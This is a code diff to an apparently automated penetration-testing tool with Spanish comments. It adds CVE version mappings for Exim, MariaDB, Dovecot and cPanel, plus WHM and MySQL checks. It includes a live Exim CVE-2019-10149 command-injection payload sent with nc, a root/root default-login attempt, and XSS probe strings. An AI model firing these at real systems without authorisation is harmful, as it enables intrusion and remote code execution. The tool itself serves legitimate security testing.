@@ -1002,6 +1002,22 @@ VERSION_CVE_MAP = [
     (r'vnc.*authentication.*none|rfb.*0\.0',5900,'critical','',             'VNC sin autenticación — acceso directo al escritorio'),
     # X11
     (r'\bx11\b|xorg|x\.org',              6000,'critical',  '',             'X11 expuesto — posible captura de pantalla y keylogging via xwd/xinput'),
+    # Exim SMTP MTA — múltiples CVEs críticos
+    (r'exim[/ _](4\.[69][0-9])',          None,'critical', 'CVE-2019-10149','Exim 4.69-4.91 RCE sin auth (return_path) — exploit/linux/smtp/exim4_string_format'),
+    (r'exim[/ _]4\.9[2-9]',              None,'critical', 'CVE-2019-15846','Exim 4.92 SNI heap overflow RCE sin auth'),
+    (r'exim[/ _](4\.(9[3-9]|[2-8][0-9])|smtpd 4)',None,'high','CVE-2023-42115','Exim AUTH out-of-bounds write — verificar patch'),
+    (r'exim[/ _]4\.',                     None,'high',     'CVE-2024-39929','Exim 4.x — multiline headers bypass para entrega de adjuntos maliciosos'),
+    # MariaDB
+    (r'mariadb[- /](5\.|10\.[0-5]\.)',    3306,'high',     '',              'MariaDB antigua — verificar CVE-2016-6664 (privesc), CVE-2012-5615 (user enum), UDF injection'),
+    (r'mariadb[- /]10\.[6-9]\.',          3306,'medium',   '',              'MariaDB 10.6-10.9 — revisar CVE-2022-32091 (crash) y permisos FILE'),
+    (r'10\.\d+\.\d+-mariadb',             3306,'medium',   '',              'MariaDB detectado — verificar autenticación anónima y plugin auth_socket'),
+    # Dovecot IMAP/POP3
+    (r'dovecot[ /](1\.|2\.[01]\.)',       None,'high',     'CVE-2019-11500','Dovecot antiguo — null-byte heap overflow'),
+    (r'dovecot',                           None,'medium',   '',              'Dovecot — verificar credenciales por defecto y CVEs de versión'),
+    # LiteSpeed Web Server
+    (r'litespeed[/ ]([1-5]\.|web server)',None,'medium',   '',              'LiteSpeed — verificar rewrite-rule traversal y CVE-2022-0073'),
+    # cPanel / WHM
+    (r'cpanel|whm\b|webhost manager',     None,'medium',   'CVE-2023-29489','cPanel XSS + SSRF — verificar versión y acceso a WHM sin 2FA'),
 ]
 
 # ── CVSS v3.1 auto-vector assignment ──────────────────────────────────────────
@@ -1686,18 +1702,33 @@ def _inject_followup_steps(steps, injected, port_nums, rhost):
         injected.add("mongodb_check")
 
     if (port_nums & {8080, 8443, 8000, 8888}) and "tomcat_check" not in injected:
-        # Check for Tomcat/Jenkins/other web services on non-standard ports
-        _web_ports = ",".join(str(p) for p in sorted(port_nums & {8080, 8443, 8000, 8888, 3000, 4000, 9000}))
-        steps.append({
-            "name": "[Auto] Web Services Deep Scan (non-standard ports)",
-            "command": (
-                f"nmap -T4 -p {_web_ports} "
-                f"--script=http-auth,http-default-accounts,http-vuln-cve2017-5638,"
-                f"http-shellshock,http-phpmyadmin-dir-traversal,http-open-redirect,"
-                f"http-methods,http-title,http-server-header {rhost} 2>/dev/null"
-            ),
-            "parse": "nmap",
-        })
+        # Port 8888 on shared hosting = WHM (cPanel admin panel) — specific check
+        if 8888 in port_nums and "whm_check" not in injected:
+            steps.append({
+                "name": "[Auto] WHM/cPanel Panel Check (8888)",
+                "command": (
+                    f"CODE=$(curl -sk -o /dev/null -w '%{{http_code}}' --max-time 10 'https://{rhost}:8888/' 2>/dev/null); "
+                    f"echo \"WHM-8888=$CODE\"; "
+                    f"curl -sk --max-time 10 'https://{rhost}:8888/' 2>/dev/null | grep -oiE '<title>[^<]+</title>|cPanel|WHM|WebHost Manager' | head -5; "
+                    f"nmap -p 8888 --script http-title,http-auth-finder --script-timeout 15s {rhost} 2>/dev/null"
+                ),
+                "parse": "nmap",
+            })
+            injected.add("whm_check")
+        # Check for Tomcat/Jenkins/other web services on non-standard ports (exclude 8888)
+        _alt_web_ports = port_nums & {8080, 8443, 8000, 3000, 4000, 9000}
+        if _alt_web_ports:
+            _web_ports = ",".join(str(p) for p in sorted(_alt_web_ports))
+            steps.append({
+                "name": "[Auto] Web Services Deep Scan (non-standard ports)",
+                "command": (
+                    f"nmap -T4 -p {_web_ports} "
+                    f"--script=http-auth,http-default-accounts,http-vuln-cve2017-5638,"
+                    f"http-shellshock,http-phpmyadmin-dir-traversal,http-open-redirect,"
+                    f"http-methods,http-title,http-server-header {rhost} 2>/dev/null"
+                ),
+                "parse": "nmap",
+            })
         injected.add("tomcat_check")
 
     # Web content discovery on HTTP
@@ -5604,6 +5635,24 @@ def _kb_commands(port, service, version, target, mode):
     cmds = []
 
     # ── HTTP / HTTPS ──────────────────────────────────────────────────────────
+    # Port 8888: likely WHM (cPanel hosting panel) — targeted checks only, not generic web flood
+    if port == 8888 and "http" not in svc:
+        url_8888 = f"https://{target}:8888"
+        url_8888h = f"http://{target}:8888"
+        cmds += [
+            (10, f"WHM-Detect:{port}",
+             f"CODE=$(curl -sk -o /dev/null -w '%{{http_code}}' --max-time 10 '{url_8888}/' 2>/dev/null); "
+             f"echo \"WHM-8888-HTTPS=$CODE\"; "
+             f"curl -sk --max-time 10 '{url_8888}/' 2>/dev/null | grep -oiE '<title>[^<]+</title>|cPanel|WHM|WebHost' | head -5; "
+             f"curl -sk --max-time 10 '{url_8888h}/' 2>/dev/null | grep -oiE '<title>[^<]+</title>|cPanel|WHM|WebHost' | head -5"),
+            (15, f"WHM-DefaultCreds:{port}",
+             f"curl -sk --max-time 10 -X POST '{url_8888}/login' -d 'user=root&pass=root' 2>/dev/null | grep -i 'invalid\\|success\\|dashboard\\|cpsess' | head -3; "
+             f"curl -sk --max-time 10 '{url_8888}/cgi/login.cgi' 2>/dev/null | grep -i 'title\\|error\\|success' | head -3"),
+            (20, f"WHM-VulnCheck:{port}",
+             f"nmap -p 8888 --script http-title,http-auth-finder --script-timeout 15s {target} 2>/dev/null"),
+        ]
+        return cmds
+
     if port in (80, 443, 8080, 8443, 8000, 8008, 8888, 9090, 3000) or "http" in svc:
         scheme = "https" if (port in (443, 8443) or "ssl" in svc or "https" in svc) else "http"
         url = f"{scheme}://{target}:{port}"
@@ -5631,10 +5680,10 @@ def _kb_commands(port, service, version, target, mode):
              f" -k -t {t} -x php,html,txt,asp,aspx,jsp,bak,old -q --no-error 2>/dev/null"),
             (22, f"Nikto:{port}", f"timeout 90 nikto -h {url} -C all -maxtime 90 -nossl 2>/dev/null"),
             (25, f"FFUF-fuzz:{port}",
-             f"ffuf -u {url}/FUZZ"
+             f"timeout 90 ffuf -u {url}/FUZZ"
              f" -w /usr/share/seclists/Discovery/Web-Content/common.txt"
-             f" -mc 200,204,301,302,307,401,403 -t {t} -s -k 2>/dev/null | head -80"
-             f" || gobuster dir -u {url}"
+             f" -mc 200,204,301,302,307,401,403 -t {t} -timeout 8 -s -k 2>/dev/null | head -80"
+             f" || timeout 90 gobuster dir -u {url}"
              f" -k -w /usr/share/seclists/Discovery/Web-Content/common.txt"
              f" -t {t} -q --no-error 2>/dev/null | head -80"),
         ]
@@ -5768,17 +5817,25 @@ def _kb_commands(port, service, version, target, mode):
                  f" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
                  f" -t {t} -q 2>/dev/null"),
                 (42, f"SQLMap-Auto:{port}",
+                 # Only run sqlmap if hakrawler finds URLs with parameters (avoid blind shots)
                  f"timeout 90 bash -c '"
-                 f"hakrawler -url {url} -depth 2 2>/dev/null | head -20"
-                 f" | xargs -I@ sqlmap -u @ --batch --level 1 --risk 1 --dbs --timeout 8 -q 2>/dev/null | head -20"
-                 f" || sqlmap -u \"{url}/?id=1\" --batch --level 1 --risk 1 -q 2>/dev/null | head -20'"),
-                # Dalfox — advanced XSS scanner replacing basic curl check
+                 f"CRAWLED=$(hakrawler -url {url} -depth 2 2>/dev/null | grep -E \"\\?[a-zA-Z]+=\" | head -10); "
+                 f"if [ -n \"$CRAWLED\" ]; then "
+                 f"echo \"$CRAWLED\" | xargs -I@ sqlmap -u @ --batch --level 1 --risk 1 --dbs --timeout 8 -q 2>/dev/null | head -20; "
+                 f"else "
+                 f"echo \"[SQLMap] No URLs con parámetros encontradas — omitiendo\"; "
+                 f"fi'") if port not in (8888,) else
+                (42, f"SQLMap-Auto:{port}", f"echo '[SQLMap] Port {port} excluido (panel admin, no web app)'"),
+                # Dalfox — only probe if actual form/param found on page
                 (45, f"Dalfox-XSS:{port}",
                  f"which dalfox 2>/dev/null && ("
-                 f"dalfox url '{url}/?q=test' --skip-bav --no-color -w 20 --timeout 10 2>/dev/null | head -30; "
                  f"PARAMS=$(curl -s --max-time 8 '{url}/' 2>/dev/null | grep -oP '(name|id)=[\"\\x27]\\K[^\"\\x27]+' | sort -u | head -10); "
+                 f"FORMS=$(curl -s --max-time 8 '{url}/' 2>/dev/null | grep -ic '<form'); "
+                 f"if [ -n \"$PARAMS\" ] || [ \"$FORMS\" -gt 0 ] 2>/dev/null; then "
+                 f"dalfox url '{url}/?q=test' --skip-bav --no-color -w 20 --timeout 10 2>/dev/null | head -30; "
                  f"for p in $PARAMS; do "
-                 f"dalfox url \"{url}/?$p=test\" --skip-bav --no-color --timeout 8 2>/dev/null | grep -i 'XSS\\|FOUND\\|POC' | head -3; done"
+                 f"dalfox url \"{url}/?$p=test\" --skip-bav --no-color --timeout 8 2>/dev/null | grep -i 'XSS\\|FOUND\\|POC' | head -3; done; "
+                 f"else echo '[Dalfox] Sin formularios/params detectados — omitiendo'; fi"
                  f") || ("
                  f"curl -s --max-time 8 '{url}/?q=<script>alert(1)</script>' 2>/dev/null | grep -o '<script>alert(1)</script>' | head -1; "
                  f"curl -s --max-time 8 '{url}/search?q=<img+src=x+onerror=alert(1)>' 2>/dev/null | grep -o 'onerror=alert' | head -1)"),
@@ -6765,9 +6822,49 @@ class AutonomousEngine:
             self._enqueue(2, f"distccd-RCE:{target}",
                 f"nmap -p 3632 --script distcc-cve2004-2687 --script-args 'distcc-cve2004-2687.cmd=id' {target} 2>/dev/null", target)
 
+        # Exim SMTP RCE (CVE-2019-10149, CVE-2019-15846, CVE-2023-42115)
+        if "exim" in ver and port in (25, 587, 465):
+            exim_ver_m = re.search(r'exim[/ _]([\d.]+)', ver)
+            exim_ver = exim_ver_m.group(1) if exim_ver_m else "?"
+            self._log(f"EXPLOIT [{target}:{port}] Exim {exim_ver} detectado — probando CVE-2019-10149 + nmap vuln-scripts")
+            # nmap vuln scripts for Exim
+            self._enqueue(2, f"Exim-VulnScan:{target}:{port}",
+                f"nmap -p {port} --script smtp-vuln-cve2010-4344,smtp-open-relay "
+                f"--script-timeout 20s {target} 2>/dev/null", target)
+            # CVE-2019-10149: MAIL FROM with command substitution (Exim < 4.92)
+            if re.search(r'4\.[0-8][0-9]\.', ver) or re.search(r'4\.9[01]', ver):
+                self._log(f"EXPLOIT [{target}:{port}] Exim < 4.92 — intentando CVE-2019-10149 (return_path RCE)")
+                self._enqueue(2, f"Exim-CVE2019-10149:{target}",
+                    f"(echo 'EHLO test'; echo 'MAIL FROM:<${{'run{{id}}@x.x'}}>'; "
+                    f"echo 'RCPT TO:<postmaster@localhost>'; echo 'DATA'; "
+                    f"echo 'Subject: test'; echo ''; echo '.'; echo 'QUIT') | "
+                    f"nc -w10 {target} {port} 2>/dev/null | head -20", target)
+            # Searchsploit for exact Exim version
+            self._enqueue(3, f"Exim-Searchsploit:{target}",
+                f"searchsploit --json 'exim {exim_ver}' 2>/dev/null || searchsploit 'exim {exim_ver}' 2>/dev/null",
+                target)
+
+        # MySQL/MariaDB — check empty root password + UDF
+        if ("mysql" in svc or "mariadb" in ver) and port == 3306:
+            self._log(f"EXPLOIT [{target}:{port}] MySQL/MariaDB — verificando root sin contraseña")
+            self._enqueue(2, f"MySQL-EmptyRoot:{target}",
+                f"mysql -h {target} -u root --connect-timeout=8 -e "
+                f"'select user(),version(),@@datadir; show databases;' 2>/dev/null | head -20; "
+                f"mysql -h {target} -u '' --connect-timeout=8 -e 'select user();' 2>/dev/null | head -5",
+                target)
+
         # Searchsploit lookup for other services
-        query = f"{service} {version}".strip()
-        if len(query) < 5:
+        # Clean version string: strip nmap error/script lines (|_, |  ...), connection errors,
+        # and anything that looks like an nmap output artifact rather than a real version
+        _clean_version = version or ""
+        _clean_version = re.sub(r'\|[_\s][^\n]*', '', _clean_version)          # nmap script lines: |_smtp-commands: ...
+        _clean_version = re.sub(r"couldn't establish|connection refused|timed out|error|"
+                                r"no route|reset|failed|timeout", '', _clean_version, flags=re.IGNORECASE)
+        _clean_version = re.sub(r'[^\w\s.\-/]', ' ', _clean_version)           # remove special chars
+        _clean_version = re.sub(r'\s{2,}', ' ', _clean_version).strip()
+        # Skip if version is too short or looks like pure garbage after cleaning
+        query = f"{service} {_clean_version}".strip()
+        if len(query) < 5 or len(_clean_version.replace(service, '').strip()) < 2:
             return
         self._log(f"EXPLOIT [{target}:{port}] Searchsploit: {query}")
         out, _ = self._run_sync(f"Searchsploit:{target}:{port}",
